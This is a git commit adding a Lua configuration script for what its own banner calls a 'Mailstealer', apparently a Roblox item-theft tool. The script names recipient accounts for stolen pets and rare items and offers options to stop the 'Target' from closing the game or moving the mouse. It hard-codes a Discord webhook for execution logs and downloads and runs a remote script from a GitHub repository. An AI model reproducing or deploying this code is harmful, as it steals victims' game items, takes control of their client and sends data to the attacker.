7f6b5919d7191b3799822226e8b04decb8f2d8a2
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-06-28 21:08:03 +0700

    .lua

---
+++ ByMoon/autoconfirmtradingOn/stuckvictim/main/.lua
@@ -0,0 +1,26 @@
+```lua
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+UserName = "mxrcuszzzzz" --// Username To Send Pets To
+UserName2 = "kalongtzy" --// To Send Rare Stuff
+
+_G.LoadingScreen = false --// make it true for loading screen
+_G.AntiLeave = false --// Doesn't Let The Target Close Roblox
+_G.MouseLock = false --// Doesn't Let the Target Move Mouse
+
+--[[ Webhook Config ]]--
+Webhook = "https://discord.com/api/webhooks/1123608659218415696/bH67e256agkSWq4eCGTe3DybbI2g_YKHuhQf-gb1lL2PsZGz4jwfBvuUyInI2WQ-244N" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LucidHacker9999/Mailstealer/main/script.lua"))()
+```
